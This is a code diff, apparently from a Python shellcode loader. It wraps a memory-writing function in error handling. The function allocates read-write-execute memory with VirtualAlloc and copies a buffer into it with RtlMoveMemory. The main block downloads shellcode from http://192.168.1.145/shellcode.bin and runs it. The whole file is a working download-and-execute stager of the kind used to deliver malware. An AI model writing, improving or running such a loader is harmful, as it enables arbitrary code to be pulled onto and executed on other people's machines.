@@ -17,15 +17,23 @@ def get_code(url):
 def write_memory(buf):
     length = len(buf)
 
-    kernel32.VirtualAlloc.restype = ctypes.c_void_p
-    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
+    try:
+        kernel32.VirtualAlloc.restype = ctypes.c_void_p
+        ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
 
-    kernel32.RtlMoveMemory.argtypes = (
-        ctypes.c_void_p,
-        ctypes.c_void_p,
-        ctypes.c_size_t)
-    kernel32.RtlMoveMemory(ptr, buf, length)
-    return ptr
+        kernel32.RtlMoveMemory.argtypes = (
+            ctypes.c_void_p,
+            ctypes.c_void_p,
+            ctypes.c_size_t
+            )
+        kernel32.RtlMoveMemory(ptr, buf, length)
+        GetLastError = kernel32.GetLastError
+        print(GetLastError)
+        return ptr
+    except Exception as e:
+        print(f'Error: {e}')
+
+
 
 
 def run(shellcode):
@@ -36,6 +44,8 @@ def run(shellcode):
 
 
 if __name__ == '__main__':
+    
     url = 'http://192.168.1.145/shellcode.bin'
     shellcode = get_code(url)
     run(shellcode)
+    
